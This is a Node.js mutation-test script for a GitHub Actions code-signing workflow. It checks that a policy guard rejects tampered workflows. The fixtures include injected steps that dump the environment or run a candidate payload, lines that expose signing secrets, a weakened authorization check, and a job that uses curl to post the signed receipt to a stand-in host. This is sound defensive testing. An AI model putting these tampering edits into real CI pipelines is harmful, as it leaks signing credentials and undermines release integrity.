#!/usr/bin/env node

import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const workflow = readFileSync(
  ".github/workflows/signed-dev-acceptance.yml",
  "utf8",
);
const directory = mkdtempSync(join(tmpdir(), "minutes-signing-policy-"));

const mutations = [
  {
    name: "unnamed extra step",
    expected: "complete secret-bearing job changed",
    source: workflow.replace(
      "      - name: Upload short-lived signed acceptance artifact",
      "      - run: env\n\n      - name: Upload short-lived signed acceptance artifact",
    ),
  },
  {
    name: "buried candidate payload execution",
    expected: "complete secret-bearing job changed",
    source: workflow.replace(
      "          set -euo pipefail\n          app=\"signed/Minutes Dev.app\"\n          sidecar=",
      "          set -euo pipefail\n          echo preparing\n          bash \"$GITHUB_WORKSPACE/payload/candidate-controlled.sh\"\n          app=\"signed/Minutes Dev.app\"\n          sidecar=",
    ),
  },
  {
    name: "bracket secret access before signing",
    expected: "signing secrets must not be exposed",
    source: workflow.replace(
      "          MINUTES_BUILD_FEATURES: parakeet,metal",
      "          MINUTES_BUILD_FEATURES: parakeet,metal\n          STOLEN_CERT: ${{ secrets['APPLE_CERTIFICATE'] }}",
    ),
  },
  {
    name: "serialized secret context before signing",
    expected: "signing secrets must not be exposed",
    source: workflow.replace(
      "          MINUTES_BUILD_FEATURES: parakeet,metal",
      "          MINUTES_BUILD_FEATURES: parakeet,metal\n          STOLEN_CONTEXT: ${{ toJSON(secrets) }}",
    ),
  },
  {
    name: "additional workflow call trigger",
    expected: "only the exact reviewed workflow_dispatch trigger",
    source: workflow.replace(
      "\npermissions:\n",
      "\n  workflow_call:\n\npermissions:\n",
    ),
  },
  {
    name: "comment-only owner authorization",
    expected: "complete trigger, authorization, and unsigned-build boundary changed",
    source: workflow.replace(
      "    if: github.ref == 'refs/heads/main' && github.actor == 'silverstein'",
      "    # if: github.ref == 'refs/heads/main' && github.actor == 'silverstein'\n    if: always()",
    ),
  },
  {
    name: "comment-only protected tag binding",
    expected: "complete trigger, authorization, and unsigned-build boundary changed",
    source: workflow
      .replace(
        '          resolved="${peeled:-$exact}"',
        '          # resolved="${peeled:-$exact}"\n          resolved="$CANDIDATE_SHA"',
      )
      .replace(
        "          ref: refs/tags/acceptance-${{ needs.authorize-candidate.outputs.candidate_sha }}",
        "          # ref: refs/tags/acceptance-${{ needs.authorize-candidate.outputs.candidate_sha }}\n          ref: ${{ needs.authorize-candidate.outputs.candidate_sha }}",
      ),
  },
  {
    name: "persisted successor checkout credential",
    expected: "signed Apple Speech runtime acceptance must run in a no-secret successor job",
    source: workflow.replace(
      "          persist-credentials: false",
      "          persist-credentials: true",
    ),
  },
  // Everything after the signing job was checked for secret references and
  // nothing else, so the post-signing runtime job -- which checks out the
  // candidate and runs a candidate-controlled script to produce the receipt
  // acceptance relies on -- could be rewritten freely. None of these carry a
  // secret, which is exactly why the old pattern never fired on them.
  {
    name: "extra step appended after the runtime job",
    expected: "complete post-signing runtime boundary changed",
    source: `${workflow}      - name: Injected tail step\n        run: echo injected\n`,
  },
  {
    name: "whole new job appended after the runtime job",
    expected: "complete post-signing runtime boundary changed",
    source: `${workflow}\n  appended:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo injected\n`,
  },
  {
    name: "receipt step rewritten to skip its provenance upload",
    expected: "complete post-signing runtime boundary changed",
    // Anchored on the runtime job's own artifact path: `if-no-files-found`
    // appears three times in this workflow, and replacing the first match
    // mutates the unsigned-build job instead, which a different golden covers.
    // The harness does catch that -- the `expected` substring below stops it
    // passing for the wrong reason -- but it fails as an unsigned-build
    // boundary change, which says nothing about the region under test.
    source: workflow.replace(
      "          path: signed-runtime-provenance.json\n          if-no-files-found: error",
      "          path: signed-runtime-provenance.json\n          if-no-files-found: ignore",
    ),
  },
];

// The workflow mutations above cannot reach the region-coverage check: for any
// edit to the workflow alone, a matching pre-signing golden already implies the
// regions tile, so deleting the coverage check left every one of them passing.
// Its whole purpose is defending against a future edit to THIS FILE that
// narrows a region -- so the only test that can kill it has to mutate the guard
// itself, not the workflow.
//
// This reproduces the attack the check exists to stop: append a job that
// exfiltrates the acceptance receipt, narrow `afterSigningJob` so the new job
// falls outside it, and regenerate all three goldens to match the shrunken
// regions. Every hash then agrees and only the coverage check objects.
function assertCoverageCheckIsLoadBearing() {
  const guardSource = readFileSync("scripts/check_signed_acceptance_policy.mjs", "utf8");
  const narrowing = [
    "    ? signingJobTail.slice(nextJobOffset)\n    : \"\";",
    "    ? signingJobTail.slice(nextJobOffset, nextJobOffset + 400)\n    : \"\";",
  ];
  if (!guardSource.includes(narrowing[0])) {
    throw new Error("coverage fixture is stale: afterSigningJob is no longer sliced as expected");
  }

  const attackedWorkflow = `${workflow}\n  exfiltrate-receipt:\n    needs:\n      - run-signed-runtime\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -X POST --data-binary @signed-runtime-provenance.json https://example.invalid\n`;
  const workflowFixture = join(directory, "coverage-attack.yml");
  writeFileSync(workflowFixture, attackedWorkflow);

  let guardFixtureSource = guardSource.replace(narrowing[0], narrowing[1]);
  const guardFixture = join(directory, "guard-narrowed.mjs");

  // Regenerate every golden from the narrowed regions, exactly as someone
  // rerunning the "review it and update its golden hash" instruction would.
  const marker = "  sign-reviewed-artifact:\n";
  const start = attackedWorkflow.indexOf(marker);
  const tail = attackedWorkflow.slice(start + marker.length);
  const next = tail.search(/^  [a-z][a-z0-9-]*:\n/m);
  const sha256 = (value) => createHash("sha256").update(value).digest("hex");
  const regenerated = [
    [/const EXPECTED_PRE_SIGNING_BOUNDARY_SHA256 =\n\s*"[0-9a-f]{64}"/,
      sha256(attackedWorkflow.slice(0, start))],
    [/const EXPECTED_SIGNING_JOB_SHA256 =\n\s*"[0-9a-f]{64}"/,
      sha256(tail.slice(0, next).replace(/\n$/, ""))],
    [/const EXPECTED_POST_SIGNING_BOUNDARY_SHA256 =\n\s*"[0-9a-f]{64}"/,
      sha256(tail.slice(next, next + 400))],
  ];
  for (const [pattern, digest] of regenerated) {
    const matched = guardFixtureSource.match(pattern);
    if (!matched) throw new Error(`coverage fixture is stale: ${pattern} did not match`);
    guardFixtureSource = guardFixtureSource.replace(
      matched[0],
      matched[0].replace(/"[0-9a-f]{64}"/, `"${digest}"`),
    );
  }
  writeFileSync(guardFixture, guardFixtureSource);

  const result = spawnSync(process.execPath, [guardFixture, workflowFixture], {
    encoding: "utf8",
  });
  if (result.status === 0) {
    throw new Error(
      "a narrowed region with regenerated goldens was accepted; the coverage check is not load-bearing",
    );
  }
  if (!result.stderr.includes("outside every golden")) {
    throw new Error(
      `narrowed region rejected for the wrong reason:\n${result.stderr}`,
    );
  }
}

try {
  assertCoverageCheckIsLoadBearing();
  for (const mutation of mutations) {
    if (mutation.source === workflow) {
      throw new Error(`fixture mutation did not apply: ${mutation.name}`);
    }
    const fixture = join(directory, `${mutation.name.replaceAll(" ", "-")}.yml`);
    writeFileSync(fixture, mutation.source);
    const result = spawnSync(
      process.execPath,
      ["scripts/check_signed_acceptance_policy.mjs", fixture],
      { encoding: "utf8" },
    );
    if (result.status === 0) {
      throw new Error(`policy accepted ${mutation.name}`);
    }
    if (!result.stderr.includes(mutation.expected)) {
      throw new Error(
        `policy rejected ${mutation.name} for the wrong reason:\n${result.stderr}`,
      );
    }
  }
} finally {
  rmSync(directory, { recursive: true, force: true });
}
